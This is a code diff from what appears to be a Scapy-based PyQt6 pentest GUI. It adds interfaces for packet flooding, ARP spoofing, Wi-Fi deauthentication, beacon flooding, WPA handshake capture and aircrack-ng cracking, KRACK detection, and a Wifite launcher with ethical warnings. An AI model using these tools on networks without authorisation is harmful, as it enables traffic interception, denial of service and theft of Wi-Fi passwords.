+        flood_buttons_layout.addWidget(self.stop_flood_button)
+        main_layout.addLayout(flood_buttons_layout)
+
+        self.flood_status = QLabel("")
+        main_layout.addWidget(self.flood_status)
+        main_layout.addStretch()
+
+        # --- UI Logic ---
+        def update_template_ui(text):
+            is_custom = (text == "Custom (from Crafter)")
+            is_icmp = (text == "ICMP Echo Flood")
+
+            self.flood_target_label.setVisible(not is_custom)
+            self.flood_target_edit.setVisible(not is_custom)
+            self.flood_ports_label.setVisible(not is_custom and not is_icmp)
+            self.flood_ports_edit.setVisible(not is_custom and not is_icmp)
+            self.flood_rand_src_ip_check.setEnabled(not is_custom)
+            packet_frame.setVisible(is_custom)
+
+        self.flood_template_combo.currentTextChanged.connect(update_template_ui)
+        update_template_ui(self.flood_template_combo.currentText()) # Initial state
+
+        self.flood_button.clicked.connect(self.start_flood)
+        self.stop_flood_button.clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_firewall_tester_tool(self):
+        widget = QWidget(); layout = QVBoxLayout(widget); controls = QHBoxLayout()
+        controls.addWidget(QLabel("Target:")); self.fw_target=QLineEdit("127.0.0.1"); controls.addWidget(self.fw_target)
+        controls.addWidget(QLabel("Probe Set:")); self.fw_probe_set=QComboBox(); self.fw_probe_set.addItems(FIREWALL_PROBES.keys()); controls.addWidget(self.fw_probe_set)
+        self.fw_test_button=QPushButton("Start Test"); controls.addWidget(self.fw_test_button)
+        self.fw_cancel_button = QPushButton("Cancel"); self.fw_cancel_button.setEnabled(False); controls.addWidget(self.fw_cancel_button)
+        self.fw_status=QLabel(""); controls.addWidget(self.fw_status); controls.addStretch()
+        layout.addLayout(controls)
+        self.fw_tree=QTreeWidget(); self.fw_tree.setColumnCount(3); self.fw_tree.setHeaderLabels(["Probe Description","Packet Summary","Result"])
+        layout.addWidget(self.fw_tree)
+        layout.addWidget(self._create_export_button(self.fw_tree))
+        self.fw_test_button.clicked.connect(self.start_firewall_test)
+        self.fw_cancel_button.clicked.connect(self.cancel_tool)
+        return widget
+
+    def _update_tcp_scan_options_visibility(self, checked):
+        """Shows or hides the TCP scan mode dropdown based on protocol selection."""
+        is_tcp_selected = self.scan_proto_tcp_radio.isChecked() or self.scan_proto_udp_radio.isChecked()
+        self.tcp_scan_type_label.setVisible(is_tcp_selected)
+        self.tcp_scan_type_combo.setVisible(is_tcp_selected)
+
+    def _create_arp_spoofer_tool(self):
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        # Ethical Warning
+        warning_label = QTextEdit()
+        warning_label.setReadOnly(True)
+        warning_label.setStyleSheet("background-color: #4c2222; color: #f0f0f0; border: 1px solid #993333;")
+        warning_label.setHtml("""
+        <font color='#ffcc00'><b>WARNING & ETHICAL NOTICE:</b></font>
+        <p>ARP Spoofing is a powerful technique that can intercept and modify network traffic (Man-in-the-Middle attack). Using this tool on networks you do not own or have explicit, written permission to test is <b>illegal</b> and unethical.</p>
+        <p>This tool is for educational and authorized security testing purposes only. The developer assumes no liability for misuse.</p>
+        """)
+        layout.addWidget(warning_label)
+
+        # Controls
+        controls = QFrame()
+        controls.setFrameShape(QFrame.Shape.StyledPanel)
+        clayout = QVBoxLayout(controls)
+
+        # Target Inputs
+        row1 = QHBoxLayout()
+        row1.addWidget(QLabel("Victim IP:"))
+        self.arp_spoof_victim_ip = QLineEdit()
+        self.arp_spoof_victim_ip.setPlaceholderText("e.g., 192.168.1.10")
+        self.arp_spoof_victim_ip.setToolTip("The IP address of the target (victim) machine on the local network.")
+        row1.addWidget(self.arp_spoof_victim_ip)
+        clayout.addLayout(row1)
+
+        row2 = QHBoxLayout()
+        row2.addWidget(QLabel("Target IP (Gateway):"))
+        self.arp_spoof_target_ip = QLineEdit()
+        self.arp_spoof_target_ip.setPlaceholderText("e.g., 192.168.1.1")
+        self.arp_spoof_target_ip.setToolTip("The IP address of the machine you want to impersonate (usually the gateway).")
+        row2.addWidget(self.arp_spoof_target_ip)
+        clayout.addLayout(row2)
+
+        # Buttons
+        buttons_layout = QHBoxLayout()
+        self.arp_spoof_start_btn = QPushButton("Start Spoofing")
+        self.arp_spoof_start_btn.setToolTip("Begin sending malicious ARP packets to poison the cache of the victim and target.")
+        buttons_layout.addWidget(self.arp_spoof_start_btn)
+        self.arp_spoof_stop_btn = QPushButton("Stop Spoofing")
+        self.arp_spoof_stop_btn.setEnabled(False)
+        self.arp_spoof_stop_btn.setToolTip("Stop the attack and send corrective ARP packets to restore the network.")
+        buttons_layout.addWidget(self.arp_spoof_stop_btn)
+        clayout.addLayout(buttons_layout)
+
+        # Status Label
+        self.arp_spoof_status = QLabel("Status: Idle")
+        clayout.addWidget(self.arp_spoof_status)
+
+        layout.addWidget(controls)
+        layout.addStretch()
+
+        self.arp_spoof_start_btn.clicked.connect(self.start_arp_spoof)
+        self.arp_spoof_stop_btn.clicked.connect(self.stop_arp_spoof)
+
+        return widget
+
+    def _create_system_info_tab(self):
+        """Creates the System Info tab with a redesigned, more modern layout."""
+        scroll_area = QScrollArea()
+        scroll_area.setWidgetResizable(True)
+        scroll_area.setStyleSheet("QScrollArea { border: none; }") # Remove scroll area border
+
+        main_widget = QWidget()
+        main_layout = QVBoxLayout(main_widget)
+        main_layout.setSpacing(20)
+        main_layout.setContentsMargins(20, 20, 20, 20)
+        scroll_area.setWidget(main_widget)
+
+        # --- Helper for creating styled GroupBoxes ---
+        def create_info_box(title):
+            box = QGroupBox(title)
+            # Basic styling for a modern "card" look
+            box.setStyleSheet("""
+                QGroupBox {
+                    font-size: 14px;
+                    font-weight: bold;
+                    border: 1px solid #444;
+                    border-radius: 8px;
+                    margin-top: 10px;
+                }
+                QGroupBox::title {
+                    subcontrol-origin: margin;
+                    subcontrol-position: top left;
+                    padding: 0 10px;
+                }
+            """)
+            layout = QFormLayout(box)
+            layout.setSpacing(10)
+            layout.setContentsMargins(15, 25, 15, 15) # Top margin for title
+            return box, layout
+
+        # --- Top Row: System, CPU, Memory ---
+        top_row_layout = QHBoxLayout()
+        top_row_layout.setSpacing(20)
+
+        # System Info Box
+        sys_box, sys_layout = create_info_box("System")
+        sys_layout.addRow("OS:", QLabel(f"{platform.system()} {platform.release()}"))
+        sys_layout.addRow("Architecture:", QLabel(platform.machine()))
+        sys_layout.addRow("Hostname:", QLabel(platform.node()))
+        sys_layout.addRow("Python Version:", QLabel(platform.python_version()))
+        top_row_layout.addWidget(sys_box)
+
+        # CPU Info Box
+        cpu_box, cpu_layout = create_info_box("CPU")
+        try:
+            cpu_freq = psutil.cpu_freq()
+            freq_str = f"{cpu_freq.current:.2f} Mhz (Max: {cpu_freq.max:.2f} Mhz)" if cpu_freq else "N/A"
+        except Exception:
+            freq_str = "N/A (Permission Denied)"
+        cpu_layout.addRow("Frequency:", QLabel(freq_str))
+        cpu_layout.addRow("Physical Cores:", QLabel(str(psutil.cpu_count(logical=False))))
+        cpu_layout.addRow("Logical Cores:", QLabel(str(psutil.cpu_count(logical=True))))
+        top_row_layout.addWidget(cpu_box)
+
+        # Memory Info Box
+        mem_box, mem_layout = create_info_box("Memory")
+        mem = psutil.virtual_memory()
+        swap = psutil.swap_memory()
+        mem_layout.addRow("Total RAM:", QLabel(f"{mem.total / (1024**3):.2f} GB"))
+        mem_layout.addRow("Available RAM:", QLabel(f"{mem.available / (1024**3):.2f} GB"))
+        mem_layout.addRow("Swap Total:", QLabel(f"{swap.total / (1024**3):.2f} GB"))
+        mem_layout.addRow("Swap Used:", QLabel(f"{swap.used / (1024**3):.2f} GB ({swap.percent}%)"))
+        top_row_layout.addWidget(mem_box)
+
+        main_layout.addLayout(top_row_layout)
+
+        # --- Second Row: Libraries and GPU ---
+        second_row_layout = QHBoxLayout()
+        second_row_layout.setSpacing(20)
+
+        # Library Versions Box
+        try:
+            scapy_version = scapy.VERSION
+        except AttributeError:
+            scapy_version = "Unknown"
+        lib_box, lib_layout = create_info_box("Library Versions")
+        lib_layout.addRow("Scapy:", QLabel(scapy_version))
+        lib_layout.addRow("PyQt6:", QLabel(PYQT_VERSION_STR))
+        lib_layout.addRow("psutil:", QLabel(psutil.__version__))
+        if GPUtil:
+            lib_layout.addRow("GPUtil:", QLabel(getattr(GPUtil, '__version__', 'N/A')))
+        second_row_layout.addWidget(lib_box)
+
+        # GPU Info Box
+        if GPUtil:
+            gpu_box, gpu_layout = create_info_box("GPU Information")
+            try:
+                gpus = GPUtil.getGPUs()
+                if not gpus:
+                    gpu_layout.addRow(QLabel("No NVIDIA GPU detected."))
+                else:
+                    for i, gpu in enumerate(gpus):
+                        gpu_layout.addRow(f"GPU {i} Name:", QLabel(gpu.name))
+                        gpu_layout.addRow("  - Driver:", QLabel(gpu.driver))
+                        gpu_layout.addRow("  - Memory:", QLabel(f"{gpu.memoryUsed}MB / {gpu.memoryTotal}MB"))
+            except Exception as e:
+                gpu_layout.addRow(QLabel(f"Could not retrieve GPU info: {e}"))
+            second_row_layout.addWidget(gpu_box)
+
+        second_row_layout.addStretch()
+        main_layout.addLayout(second_row_layout)
+
+        # --- Disk Partitions Box ---
+        disk_box = QGroupBox("Disk Partitions")
+        disk_box.setStyleSheet("""
+            QGroupBox {
+                font-size: 14px;
+                font-weight: bold;
+                border: 1px solid #444;
+                border-radius: 8px;
+                margin-top: 10px;
+            }
+            QGroupBox::title {
+                subcontrol-origin: margin;
+                subcontrol-position: top left;
+                padding: 0 10px;
+            }
+        """)
+        disk_layout = QGridLayout(disk_box)
+        disk_layout.setContentsMargins(15, 25, 15, 15)
+        try:
+            partitions = psutil.disk_partitions()
+            if not partitions:
+                disk_layout.addWidget(QLabel("No disk partitions found."), 0, 0)
+            else:
+                row, col = 0, 0
+                for part in partitions:
+                    try:
+                        usage = psutil.disk_usage(part.mountpoint)
+                        part_label = QLabel(f"<b>{part.device}</b> on {part.mountpoint} ({part.fstype})<br>"
+                                          f"&nbsp;&nbsp;Total: {usage.total / (1024**3):.2f} GB, "
+                                          f"Used: {usage.used / (1024**3):.2f} GB ({usage.percent}%)")
+                        disk_layout.addWidget(part_label, row, col)
+                        col += 1
+                        if col >= 2: # 2 columns
+                            col = 0
+                            row += 1
+                    except Exception:
+                        continue # Skip inaccessible drives
+        except Exception as e:
+            disk_layout.addWidget(QLabel(f"Could not retrieve disk partitions: {e}"), 0, 0)
+        main_layout.addWidget(disk_box)
+
+
+        # --- Network Interfaces Box ---
+        net_box = QGroupBox("Network Interfaces")
+        net_box.setStyleSheet("""
+            QGroupBox {
+                font-size: 14px; font-weight: bold; border: 1px solid #444;
+                border-radius: 8px; margin-top: 10px;
+            }
+            QGroupBox::title {
+                subcontrol-origin: margin; subcontrol-position: top left; padding: 0 10px;
+            }
+        """)
+        net_main_layout = QVBoxLayout(net_box)
+        net_main_layout.setContentsMargins(15, 25, 15, 15)
+
+        try:
+            ifaddrs = psutil.net_if_addrs()
+            if not ifaddrs:
+                net_main_layout.addWidget(QLabel("No network interfaces found."))
+            else:
+                for iface, addrs in sorted(ifaddrs.items()):
+                    # Skip loopback interfaces unless they have a non-standard address
+                    is_loopback = 'loopback' in iface.lower() or iface.startswith('lo')
+                    if is_loopback and all(addr.address in ['127.0.0.1', '::1'] for addr in addrs):
+                        continue
+
+                    iface_box = QGroupBox(iface)
+                    iface_box.setStyleSheet("QGroupBox { border: 1px solid #555; margin-top: 5px; }")
+                    iface_layout = QFormLayout(iface_box)
+
+                    addr_map = {'ipv4': [], 'ipv6': [], 'mac': 'N/A'}
+                    for addr in addrs:
+                        if addr.family == socket.AF_INET:
+                            addr_map['ipv4'].append(addr.address)
+                        elif addr.family == socket.AF_INET6:
+                            # Filter out link-local addresses for cleaner display
+                            if not addr.address.startswith('fe80::'):
+                                addr_map['ipv6'].append(addr.address)
+                        # This logic correctly handles cross-platform MAC address retrieval
+                        elif hasattr(psutil, 'AF_LINK') and addr.family == psutil.AF_LINK:
+                            addr_map['mac'] = addr.address
+                        elif hasattr(socket, 'AF_PACKET') and addr.family == socket.AF_PACKET:
+                             addr_map['mac'] = addr.address
+
+                    # Join multiple IPs, or display N/A if none were found
+                    ipv4_str = ", ".join(addr_map['ipv4']) or "N/A"
+                    ipv6_str = ", ".join(addr_map['ipv6']) or "N/A"
+
+                    iface_layout.addRow(QLabel("<b>IPv4 Address:</b>"), QLabel(ipv4_str))
+                    iface_layout.addRow(QLabel("<b>IPv6 Address:</b>"), QLabel(ipv6_str))
+                    iface_layout.addRow(QLabel("<b>MAC Address:</b>"), QLabel(addr_map['mac']))
+
+                    net_main_layout.addWidget(iface_box)
+        except Exception as e:
+            logging.error(f"Could not retrieve network interfaces: {e}", exc_info=True)
+            net_main_layout.addWidget(QLabel(f"Could not retrieve interfaces: {e}"))
+
+        main_layout.addWidget(net_box)
+
+        main_layout.addStretch() # Push everything to the top
+        return scroll_area
+
+    def _create_wireless_tools_tab(self, p=None):
+        """Creates the tab container for 802.11 wireless tools."""
+        wireless_tabs = QTabWidget()
+        wireless_tabs.addTab(self._create_wifi_scanner_tool(), "Wi-Fi Scanner")
+        wireless_tabs.addTab(self._create_deauth_tool(), "Deauthentication Tool")
+        wireless_tabs.addTab(self._create_beacon_flood_tool(), "Beacon Flood")
+        wireless_tabs.addTab(self._create_wpa_crack_tool(), "WPA Handshake Tool")
+        wireless_tabs.addTab(self._create_krack_scanner_tool(), "KRACK Scanner")
+        wireless_tabs.addTab(self._create_wifite_tool(), "Wifite Auditor")
+        return wireless_tabs
+
+    def _create_krack_scanner_tool(self):
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        instructions = QTextEdit()
+        instructions.setReadOnly(True)
+        instructions.setHtml("""
+        <font color='#ffcc00'><b>KRACK Vulnerability Scanner</b></font>
+        <p>This tool passively detects networks vulnerable to Key Reinstallation Attacks (KRACK). It works by listening for retransmitted EAPOL Message 3 packets during a 4-way handshake.</p>
+        <p><b>Usage:</b></p>
+        <ol>
+            <li>Ensure your wireless card is in <b>Monitor Mode</b> and select it at the top.</li>
+            <li>Click "Start Scan". The tool will listen indefinitely.</li>
+            <li>To trigger a handshake, you can use the Deauthentication Tool to briefly disconnect a client, forcing it to reconnect.</li>
+            <li>Any vulnerable networks detected will appear in the results table below.</li>
+        </ol>
+        """)
+        layout.addWidget(instructions)
+
+        controls = QHBoxLayout()
+        self.krack_start_btn = QPushButton("Start Scan")
+        self.krack_stop_btn = QPushButton("Stop Scan"); self.krack_stop_btn.setEnabled(False)
+        controls.addWidget(self.krack_start_btn)
+        controls.addWidget(self.krack_stop_btn)
+        layout.addLayout(controls)
+
+        self.krack_results_tree = QTreeWidget()
+        self.krack_results_tree.setColumnCount(3)
+        self.krack_results_tree.setHeaderLabels(["BSSID (AP)", "Client MAC", "Time Detected"])
+        layout.addWidget(self.krack_results_tree)
+
+        self.krack_start_btn.clicked.connect(self.start_krack_scan)
+        self.krack_stop_btn.clicked.connect(self.stop_krack_scan)
+
+        return widget
+
+    def _create_wifite_tool(self):
+        """Creates the UI for the Wifite automated wireless auditor."""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        # --- Instructions and Warning ---
+        instructions = QTextEdit()
+        instructions.setReadOnly(True)
+        instructions.setHtml("""
+        <font color='#ffcc00'><b>Wifite Automated Auditor</b></font>
+        <p>This tool runs the Wifite script to automatically audit WPA/WPA2/WPS encrypted networks.</p>
+        <p><b>WARNING:</b> This is an active attack tool. You MUST have explicit permission to test the target network. Ensure your wireless card is in <b>Monitor Mode</b> and select it from the main interface dropdown.</p>
+        """)
+        layout.addWidget(instructions)
+
+        # --- Controls ---
+        controls_frame = QGroupBox("Wifite Options")
+        controls_layout = QFormLayout(controls_frame)
+
+        self.wifite_essid_edit = QLineEdit()
+        self.wifite_essid_edit.setPlaceholderText("Leave blank for an attack on all networks")
+        controls_layout.addRow("Target ESSID:", self.wifite_essid_edit)
+
+        options_layout = QHBoxLayout()
+        self.wifite_wps_check = QCheckBox("WPS Attacks (--wps)")
+        self.wifite_pmkid_check = QCheckBox("PMKID Attacks (--pmkid)")
+        self.wifite_kill_check = QCheckBox("Kill Conflicting Processes (--kill)")
+        self.wifite_wps_check.setToolTip("Run only WPS attacks.")
+        self.wifite_pmkid_check.setToolTip("Run only PMKID attacks.")
+        self.wifite_kill_check.setToolTip("Kill processes that interfere with monitor mode.")
+        options_layout.addWidget(self.wifite_wps_check)
+        options_layout.addWidget(self.wifite_pmkid_check)
+        options_layout.addWidget(self.wifite_kill_check)
+        controls_layout.addRow("Attack Types:", options_layout)
+
+        layout.addWidget(controls_frame)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        self.wifite_start_btn = QPushButton(QIcon("icons/wifi.svg"), " Start Wifite Scan")
+        self.wifite_stop_btn = QPushButton("Stop Wifite"); self.wifite_stop_btn.setEnabled(False)
+        buttons_layout.addWidget(self.wifite_start_btn)
+        buttons_layout.addWidget(self.wifite_stop_btn)
+        layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.wifite_output_console = QPlainTextEdit()
+        self.wifite_output_console.setReadOnly(True)
+        self.wifite_output_console.setFont(QFont("Courier New", 10))
+        self.wifite_output_console.setPlaceholderText("Wifite output will be displayed here...")
+        layout.addWidget(self.wifite_output_console, 1) # Add stretch factor
+
+        self.wifite_start_btn.clicked.connect(self.start_wifite_scan)
+        self.wifite_stop_btn.clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def start_wifite_scan(self):
+        """Starts the Wifite scan worker thread."""
+        if not shutil.which("wifite"):
+            QMessageBox.critical(self, "Wifite Error", "'wifite' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        iface = self.get_selected_iface()
+        if not iface:
+            QMessageBox.warning(self, "Interface Error", "Please select a monitor-mode wireless interface.")
+            return
+
+        # Use pkexec to request root privileges graphically if available and not root
+        try:
+            is_root = (os.geteuid() == 0)
+        except AttributeError: # os.geteuid() does not exist on Windows
+            is_root = False
+
+        command_prefix = []
+        if not is_root and shutil.which("pkexec"):
+             command_prefix = ["pkexec"]
+        elif not is_root:
+            QMessageBox.critical(self, "Permission Error", "Wifite requires root privileges. Please run GScapy with sudo or ensure pkexec is installed for graphical password prompts.")
+            return
+
+        command = command_prefix + ["wifite", "-i", iface]
+        essid = self.wifite_essid_edit.text().strip()
+        if essid:
+            command.extend(["--essid", essid])
+
+        if self.wifite_wps_check.isChecked():
+            command.append("--wps")
+        if self.wifite_pmkid_check.isChecked():
+            command.append("--pmkid")
+        if self.wifite_kill_check.isChecked():
+            command.append("--kill")
+
+        self.is_tool_running = True
+        self.wifite_start_btn.setEnabled(False)
+        self.wifite_stop_btn.setEnabled(True)
+        self.tool_stop_event.clear()
+        self.wifite_output_console.clear()
+
+        self.worker = WorkerThread(_wifite_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _wifite_thread(self, command):
+        """Worker thread for running the wifite command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting Wifite with command: {' '.join(command)}")
+        q.put(('wifite_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            if sys.platform == "win32":
+                q.put(('error', 'Platform Error', 'Wifite is not supported on Windows.'))
+                q.put(('tool_finished', 'wifite_scan'))
+                return
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.wifite_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    # Terminating the parent pkexec/sudo is tricky, we try to kill the child wifite
+                    try:
+                        # This might require root to kill a root process if not run with sudo
+                        os.kill(process.pid, signal.SIGTERM)
+                        logging.info(f"Sent SIGTERM to wifite process {process.pid}")
+                    except Exception as e:
+                        logging.error(f"Could not kill wifite process: {e}")
+                    q.put(('wifite_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('wifite_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'Wifite Error', "'wifite' command not found. Please ensure it is installed and in your system's PATH."))
+        except AttributeError: # os.geteuid() doesn't exist on windows
+             q.put(('error', 'Platform Error', 'Wifite requires a Linux-based system with root privileges.'))
+        except Exception as e:
+            logging.error(f"Wifite thread error: {e}", exc_info=True)
+            q.put(('error', 'Wifite Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'wifite_scan'))
+            with self.thread_finish_lock:
+                self.wifite_process = None
+            logging.info("Wifite scan thread finished.")
+
+
+    def _create_wifi_scanner_tool(self):
+        widget = QWidget(); layout = QVBoxLayout(widget)
+        instructions = QTextEdit()
+        instructions.setReadOnly(True)
+        instructions.setStyleSheet("background-color: #3c3c3c; color: #f0f0f0; border: 1px solid #555;")
+        instructions.setHtml("""
+        <font color='#ffcc00'><b>WARNING:</b> Wireless tools require the selected interface to be in <b>Monitor Mode</b>.</font>
+        <p>GScapy cannot enable this mode for you. You must do it manually before scanning.</p>
+        <p><b>Example for Linux (using airmon-ng):</b></p>
+        <ol>
+            <li>Find your interface: <code>iwconfig</code> (e.g., wlan0)</li>
+            <li>Start monitor mode: <code>sudo airmon-ng start wlan0</code></li>
+            <li>A new interface (e.g., wlan0mon) will be created.</li>
+            <li><b>Select the new monitor interface (e.g., wlan0mon) from the dropdown at the top of the GScapy window.</b></li>
+        </ol>
+        """)
+        layout.addWidget(instructions)
+        controls = QHBoxLayout()
+        self.wifi_scan_button = QPushButton("Scan for Wi-Fi Networks")
+        self.wifi_scan_button.setToolTip("Scans for nearby Wi-Fi networks.\nThe selected interface must be in monitor mode.")
+        controls.addWidget(self.wifi_scan_button)
+        self.wifi_scan_stop_button = QPushButton("Stop Scan")
+        self.wifi_scan_stop_button.setToolTip("Stops the current Wi-Fi scan.")
+        self.wifi_scan_stop_button.setEnabled(False)
+        controls.addWidget(self.wifi_scan_stop_button)
+        self.wifi_scan_status = QLabel(""); controls.addWidget(self.wifi_scan_status); controls.addStretch()
+        layout.addLayout(controls)
+        self.wifi_tree = QTreeWidget(); self.wifi_tree.setColumnCount(4); self.wifi_tree.setHeaderLabels(["SSID", "BSSID", "Channel", "Signal"])
+        layout.addWidget(self.wifi_tree)
+        layout.addWidget(self._create_export_button(self.wifi_tree))
+        self.wifi_scan_button.clicked.connect(self.start_wifi_scan)
+        self.wifi_scan_stop_button.clicked.connect(self.stop_wifi_scan)
+        return widget
+
+    def _create_wpa_crack_tool(self):
+        """Creates the UI for the WPA Handshake and Cracking tool."""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        # --- Handshake Capture Section ---
+        capture_box = QGroupBox("WPA Handshake Capture")
+        capture_layout = QVBoxLayout(capture_box)
+
+        target_layout = QHBoxLayout()
+        target_layout.addWidget(QLabel("Target BSSID:"))
+        self.wpa_target_combo = QComboBox(); self.wpa_target_combo.setToolTip("Select a target network from the list discovered by the Wi-Fi Scanner.")
+        target_layout.addWidget(self.wpa_target_combo)
+        refresh_btn = QPushButton("Refresh List"); refresh_btn.setToolTip("Update the list of targets from the Wi-Fi Scanner tab.")
+        refresh_btn.clicked.connect(self._refresh_wpa_targets)
+        target_layout.addWidget(refresh_btn)
+        capture_layout.addLayout(target_layout)
+
+        capture_controls = QHBoxLayout()
+        self.wpa_capture_btn = QPushButton("Start Handshake Capture"); self.wpa_capture_btn.setToolTip("Begin sniffing for a WPA handshake from the selected target.")
+        capture_controls.addWidget(self.wpa_capture_btn)
+        self.wpa_deauth_client_btn = QPushButton("Deauth Client to Speed Up"); self.wpa_deauth_client_btn.setToolTip("Send deauthentication packets to the network to encourage a client to reconnect, speeding up handshake capture.")
+        capture_controls.addWidget(self.wpa_deauth_client_btn)
+        capture_layout.addLayout(capture_controls)
+
+        self.wpa_capture_status = QLabel("Status: Idle")
+        capture_layout.addWidget(self.wpa_capture_status)
+        layout.addWidget(capture_box)
+
+        # --- Hash Cracker Section ---
+        cracker_box = QGroupBox("WPA Hash Cracker")
+        cracker_layout = QVBoxLayout(cracker_box)
+
+        pcap_layout = QHBoxLayout()
+        pcap_layout.addWidget(QLabel("Handshake File (.pcap):"))
+        self.wpa_pcap_edit = QLineEdit(); self.wpa_pcap_edit.setPlaceholderText("Path to .pcap file containing the handshake...")
+        self.wpa_pcap_edit.setToolTip("The .pcap file containing the captured WPA handshake.")
+        pcap_layout.addWidget(self.wpa_pcap_edit)
+        pcap_browse_btn = QPushButton("Browse...")
+        pcap_browse_btn.setToolTip("Browse for a .pcap file containing a WPA handshake.")
+        pcap_browse_btn.clicked.connect(self.browse_for_pcap)
+        pcap_layout.addWidget(pcap_browse_btn)
+        cracker_layout.addLayout(pcap_layout)
+
+        wordlist_layout = QHBoxLayout()
+        wordlist_layout.addWidget(QLabel("Wordlist File:"))
+        self.wpa_wordlist_edit = QLineEdit(); self.wpa_wordlist_edit.setPlaceholderText("Path to wordlist file (or leave blank for default)...")
+        self.wpa_wordlist_edit.setToolTip("The wordlist file to use for the dictionary attack. If left blank, a small internal list will be used.")
+        wordlist_layout.addWidget(self.wpa_wordlist_edit)
+        wordlist_browse_btn = QPushButton("Browse...")
+        wordlist_browse_btn.setToolTip("Browse for a wordlist file (.txt).")
+        wordlist_browse_btn.clicked.connect(self.browse_for_wordlist)
+        wordlist_layout.addWidget(wordlist_browse_btn)
+        crunch_btn = QPushButton("Generate...")
+        crunch_btn.setToolTip("Generate a custom wordlist using Crunch (must be installed).")
+        crunch_btn.clicked.connect(self.open_crunch_generator)
+        wordlist_layout.addWidget(crunch_btn)
+        cracker_layout.addLayout(wordlist_layout)
+
+        cpu_layout = QHBoxLayout()
+        cpu_layout.addWidget(QLabel("CPU Threads:"))
+        self.wpa_threads_edit = QLineEdit("1"); self.wpa_threads_edit.setToolTip("Number of CPU threads for aircrack-ng to use.")
+        cpu_layout.addWidget(self.wpa_threads_edit)
+        cpu_layout.addStretch()
+        cracker_layout.addLayout(cpu_layout)
+
+        self.wpa_crack_btn = QPushButton("Start Cracking"); self.wpa_crack_btn.setToolTip("Begin the cracking process using aircrack-ng.")
+        cracker_layout.addWidget(self.wpa_crack_btn)
+
+        self.wpa_crack_output = QPlainTextEdit(); self.wpa_crack_output.setReadOnly(True)
+        self.wpa_crack_output.setPlaceholderText("Aircrack-ng output will be shown here...")
+        cracker_layout.addWidget(self.wpa_crack_output)
+        layout.addWidget(cracker_box)
+
+        self.wpa_capture_btn.clicked.connect(self.start_handshake_capture)
+        self.wpa_deauth_client_btn.clicked.connect(self.deauth_for_handshake)
+        self.wpa_crack_btn.clicked.connect(self.start_wpa_crack)
+
+        return widget
+
+    def _refresh_wpa_targets(self):
+        self.wpa_target_combo.clear()
+        if not self.found_networks:
+            QMessageBox.information(self, "No Networks", "No networks found. Please run the Wi-Fi Scanner first.")
+            return
+        for bssid, info in self.found_networks.items():
+            ssid = info[0]
+            self.wpa_target_combo.addItem(f"{ssid} ({bssid})", bssid)
+
+    def _browse_file_for_lineedit(self, line_edit_widget, dialog_title):
+        file_path, _ = QFileDialog.getOpenFileName(self, dialog_title, "", "All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            line_edit_widget.setText(file_path)
+
+    def _browse_save_file_for_lineedit(self, line_edit_widget, dialog_title):
+        file_path, _ = QFileDialog.getSaveFileName(self, dialog_title, "", "All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            line_edit_widget.setText(file_path)
+
+    def browse_for_pcap(self):
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select Handshake File", "", "Pcap Files (*.pcap *.pcapng);;All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            self.wpa_pcap_edit.setText(file_path)
+
+    def browse_for_wordlist(self):
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select Wordlist File", "", "Text Files (*.txt);;All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            self.wpa_wordlist_edit.setText(file_path)
+
+    def browse_nikto_output(self):
+        file_path, _ = QFileDialog.getSaveFileName(self, "Save Nikto Report", "", "HTML Files (*.html);;CSV Files (*.csv);;Text Files (*.txt);;XML Files (*.xml);;All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            self.nikto_output_file_edit.setText(file_path)
+
+    def browse_nikto_save_dir(self):
+        dir_path = QFileDialog.getExistingDirectory(self, "Select Directory to Save Responses", options=QFileDialog.Option.DontUseNativeDialog)
+        if dir_path:
+            self.nikto_save_dir_edit.setText(dir_path)
+
+    def start_wpa_crack(self):
+        if self.aircrack_thread and self.aircrack_thread.isRunning():
+            self.aircrack_thread.stop()
+            return
+
+        pcap_file = self.wpa_pcap_edit.text()
+        wordlist = self.wpa_wordlist_edit.text()
+        try:
+            threads = int(self.wpa_threads_edit.text())
+        except ValueError:
+            QMessageBox.warning(self, "Input Error", "CPU threads must be a valid number.")
+            return
+
+        if not pcap_file:
+            QMessageBox.warning(self, "Input Error", "Please provide a handshake file.")
+            return
+        if not os.path.exists(pcap_file):
+            QMessageBox.warning(self, "File Error", f"Pcap file not found:\n{pcap_file}")
+            return
+
+        if not wordlist:
+            wordlist = "default_pass.txt"
+
+        if not os.path.exists(wordlist):
+            QMessageBox.warning(self, "File Error", f"Wordlist file not found:\n{wordlist}")
+            return
+
+        self.wpa_crack_output.clear()
+        self.wpa_crack_btn.setText("Stop Cracking")
+        self.aircrack_thread = AircrackThread(pcap_file, wordlist, self, threads)
+        self.aircrack_thread.output_received.connect(self._process_aircrack_output)
+        self.aircrack_thread.finished_signal.connect(self._on_aircrack_finished)
+        self.aircrack_thread.start()
+
+    def _process_aircrack_output(self, line):
+        self.wpa_crack_output.appendPlainText(line)
+        if "KEY FOUND!" in line:
